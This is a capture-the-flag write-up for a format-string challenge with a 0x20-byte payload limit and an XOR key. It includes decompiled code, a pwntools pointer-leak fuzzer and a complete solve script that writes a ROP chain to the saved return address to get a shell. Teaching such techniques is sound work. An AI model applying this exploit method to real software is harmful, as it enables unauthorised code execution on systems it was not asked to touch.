> Format strings challenge with payload size limited to `0x20` bytes and an xor gimmick

- The binary gives us a menu in an infinite loop in which we can continue to input data to perform a vulnerable `printf` call
- There's a gimmick here that our data is continuously XOR'd with a key buffer which is initialized fo `0xff * 0x20`
### main
```c
int32_t main(int32_t argc, char** argv, char** envp)
    banner()
    char key[0x20]
    memset(&key, 0xff, 0x20)
    
    while (true)
        printchoices()
        char pw[0x20]
        getStr(&pw)
        int32_t choice = atoi(nptr: &pw)
        
        if (choice == 1)
            getStr(&pw)
            curse(&pw, &key)
            printf(format: &pw)
        else
            if (choice == 2)
                break
            
            puts(str: "Invalid option!")
    
    puts(str: "Hope you did something cool...")
    return 0
```
### getStr
```c
ssize_t getStr(int64_t arg1)
    memset(arg1, 0, 0x20)
    return read(fd: 0, buf: arg1, nbytes: 0x20)
```
### curse
```c
void curse(char (& pw)[0x20], char (& key)[0x20])
    for (int32_t i = 0; i s<= 0x1f; i += 1)
        (*pw)[sx.q(i)] ^= (*key)[sx.q(i)]
    
    for (int32_t i_1 = 0; i_1 s<= 0x1f; i_1 += 1)
        (*key)[sx.q(i_1)] = (*pw)[sx.q(i_1)]
```

- First, we grab libc and ld from the dockerfile and run `pwninit`
- The binary has no `canary` and has `Partial RELRO`
	- This indicates that we'd overwrite the `GOT` but since our format string payload is restricted to `0x20` bytes, it's not enough for a one-off overwrite
	- Instead, we'll be building a ROP chain piece by piece on the `stack`
	- Now we don't need to leak a binary address :)
- We can start by fuzzing pointers to get a `stack` and `libc` leak
### fuzzer
```python
context.log_level = "error"
for i in range(1, 100):
    io = process(exe, env={})
    io.sendafter(b"1", b"1")
    payload = f"%{i}$p".encode() + b"\x00"
    payload = xor(payload, 0xFF)
    try:
        io.sendafter(b">> ", payload)
        val = io.recvuntil(b"1. Keep formatting\n", drop=True)
        print(f"{i}: " + str(val))
    except:
        pass
    io.close()
    continue

# 1: b'0x7fffca2b97e01'
# 17: b'0x7f627c5d74481'
```

- Now that we have a `libc` and `stack` address, we can calculate the base `libc` address and the stored `rip` address with gdb 
- Afterwards, we need to find our format string variable offset on the stack with various `%x$p`
	- The index is cleanly at quadword 6, no `offset_bytes` required
- Now, we just need to build our `ROP` chain, short by short, starting from stored `rip`
	- We can either do a simple `ret2libc` or we can use a `one_gadget`, either works and the chain is about the same size
### solve
```python
#!/usr/bin/env python3

from pwn import *

exe = "./cursed_format_patched"
elf = context.binary = ELF(exe, checksec=False)
libc = "./libc.so.6"
libc = ELF(libc, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

def printf(payload: bytes) -> None:
    global key
    io.sendafter(b">> ", b"1")
    content = payload.ljust(0x20, b"\x00")
    payload = xor(content, key)
    io.send(payload)
    key = content

# initialize key variable
key = b"\xff" * 0x20

# found with gdb
libcOffset = 0x23D7A
stkOffset = 0x58

context.log_level = "debug"
io = process(exe, env={})

# leak the stack and libc addresses from our fuzzer
# 1: b'0x7fffca2b97e01'
# 17: b'0x7f627c5d74481'
payload = b"%1$p %17$p"
printf(payload)
stkLeak, libcLeak = [
    int(i, 16) for i in io.recvuntil(b"1. Keep formatting", drop=True).split()
]
libc.address = libcLeak - libcOffset
savedRIP = stkLeak + stkOffset
info("savedRIP: %#x", savedRIP)
info("libcBase: %#x", libc.address)

# construct our ROP chain
onegadget = libc.address + 0xC8310
rop = ROP(libc)
rop.raw(rop.rsi.address)
rop.raw(0)
rop.raw(onegadget)
chain = rop.chain()

# write our ROP chain to saved rip, short by short
for i in range(0, len(chain), 2):
    payload = fmtstr_payload(
        offset=6, writes={savedRIP + i: chain[i : i + 2]}, write_size="short"
    )
    printf(payload)

# exit main, invoking return
io.sendafter(b">> ", b"2")
io.interactive()
```
